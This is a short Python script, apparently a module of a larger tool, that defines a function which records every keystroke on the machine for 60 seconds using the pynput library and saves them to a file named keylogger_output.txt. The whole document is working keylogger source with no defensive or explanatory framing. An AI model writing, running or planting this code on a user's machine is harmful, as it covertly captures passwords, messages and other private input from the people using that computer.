import pynput.keyboard
import time

def run():
    log = []

    def on_press(key):
        try:
            log.append(key.char)
        except AttributeError:
            log.append(f"[{key}]")

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

    # Capture keystrokes for a set amount of time
    time.sleep(60)  # 1 minute
    listener.stop()

    log_data = ''.join(log)
    with open('keylogger_output.txt', 'w') as file:
        file.write(log_data)

    return 'keylogger_output.txt'

